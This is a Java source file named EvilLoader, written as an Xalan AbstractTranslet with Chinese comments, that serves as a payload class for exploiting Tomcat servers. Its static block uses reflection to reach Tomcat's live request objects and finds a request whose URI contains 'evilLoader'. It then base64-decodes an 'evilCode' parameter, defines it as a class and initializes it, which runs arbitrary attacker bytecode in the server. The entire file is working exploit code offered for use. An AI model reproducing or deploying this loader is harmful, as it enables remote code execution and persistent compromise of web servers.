import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.*;
import org.apache.tomcat.util.net.AbstractEndpoint;
import sun.misc.BASE64Decoder;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

public class EvilLoader extends AbstractTranslet {
    static {
        try {
            // 获取 request 过程
            //
            // Thread.currentThread().getContextClassLoader => WebappClassLoaderBase.getResources().getContext =>
            // StandardContext.context => ApplicationContext.service => StandardService.findConnectors() connectors =>
            // (connector[i].getScheme().equals("http")) Connector.protocolHandler =>
            // AbstractHttp11Protocol.handler (这里一系列构造函数才到 handler： ProtocolHandler.create() => Http11NioProtocol.init => AbstractHttp11JsseProtocol.init 中 new AbstractProtocol$ConnectionHandler 赋值给 handler)
            // AbstractProtocol$ConnectionHandler.global => RequestGroupInfo.processors => (processors[i]) RequestInfo.req

            // StandardContext
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Context standardContext = webappClassLoaderBase.getResources().getContext();

            // context (ApplicationContext)
            Field contextField = StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) contextField.get(standardContext);

            // service (StandardService)
            Field serviceField = ApplicationContext.class.getDeclaredField("service");
            serviceField.setAccessible(true);
            StandardService standardService = (StandardService) serviceField.get(applicationContext);

            // connectors (Connector[])
            Connector[] connectors = standardService.findConnectors();
            for (Connector connector: connectors) {
                if (connector.getScheme().equals("http")) {
                    // protocolHandler (AbstractHttp11Protocol -> AbstractProtocol)
                    Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
                    protocolHandlerField.setAccessible(true);
                    // 这里使用 AbstractProtocol 而非 AbstractHttp11Protocol 的原因是，AbstractHttp11Protocol 继承 AbstractProtocol，
                    // handler 成员在 AbstractProtocol 中，我们无法通过 AbstractHttp11Protocol 的反射获取父类的非 public 成员元素
                    AbstractProtocol protocolHandler = (AbstractProtocol) protocolHandlerField.get(connector);

                    // handler (AbstractProtocol$ConnectionHandler)
                    Method getHandlerMethod = AbstractProtocol.class.getDeclaredMethod("getHandler");
                    // 因为 AbstractProtocol$ConnectionHandler 类 implements 了 AbstractEndpoint.Handler
                    // 所以用 AbstractEndpoint.Handler 接收
                    AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler);

                    // global (RequestGroupInfo)
                    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);

                    // processors (ArrayList<RequestInfo>)
                    Field processorsField = RequestGroupInfo.class.getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    ArrayList<RequestInfo> processors = (ArrayList) processorsField.get(global);

                    for (RequestInfo requestInfo: processors) {
                        // 含有 evilLoader 的才是 loader
                        if (requestInfo.getCurrentUri().contains("evilLoader")) {
                            System.out.println("evil loader");
                            // req (Request)
                            Field reqField = RequestInfo.class.getDeclaredField("req");
                            reqField.setAccessible(true);
                            Request req = (Request) reqField.get(requestInfo);

                            // 恶意的加密的数据，
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
                            String evilCode = request.getParameter("evilCode");
                            byte[] evilBytesCode = new BASE64Decoder().decodeBuffer(evilCode);
                            // 可以将输出写在这里
                            // org.apache.catalina.connector.Response response = request.getResponse();

                            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                            defineClassMethod.setAccessible(true);
                            Class cc = (Class) defineClassMethod.invoke(EvilLoader.class.getClassLoader(), evilBytesCode, 0, evilBytesCode.length);
                            // Class.forName 会进行类的初始化，使得 static 中的代码执行
                            Class.forName(cc.getName());
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
